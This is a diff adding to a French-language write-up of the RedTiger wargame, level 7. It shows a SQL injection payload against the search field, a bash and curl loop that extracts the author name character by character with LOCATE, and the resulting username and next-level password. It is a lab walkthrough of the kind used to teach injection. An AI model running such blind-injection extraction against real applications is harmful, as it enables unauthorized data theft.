@@ -172,6 +172,35 @@ Email: 	m0nsterk1ll
 ```SQL
 SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE '%bidon'%' OR text.title LIKE '%bidon'%')
 ```
+La recherche suivante nous indique la taille du nom de l'auteur :
+```SQL
+google%' and length(news.autor)=17 and '%'='
+```
+Compte tenu des limitations SQL, on recherche les caractères composant le nom avec LOCATE :
+```nix
+for i in {1..17}; do
+for x in `echo {A..Z} {a..z} {0..9}`; do 
+	curl -s --insecure -b level7login=dont_shout_at_your_disks%2A%2A%2A https://redtiger.labs.overthewire.org/level7.php -d "dosearch=search\!&search=google%' and locate('$x',news.autor,$i)=1 and '%'='" | grep "FRANCISCO"
+	rc=$?
+	
+	
+	if [[ $rc == 0 ]] ; then
+
+		echo "found : $x"
+		break;
+	
+	fi
+done
+done
+```
+==> TESTUSERFORG00GLE
+PB : pas de distinction majuscules/minuscules avec LOCATE :'-(
+utilisation de locate('$x',news.autor COLLATE latin1_general_cs,$i)=$i
+==> TestUserforg00gle
+ User correct.
+
+The password for the next level is: MOOcowMEOWcatOinkPIG 
+
 ##Level 8 : SQL-Injection
 ##Level 9 : SQL-Injection
 ##Level 10
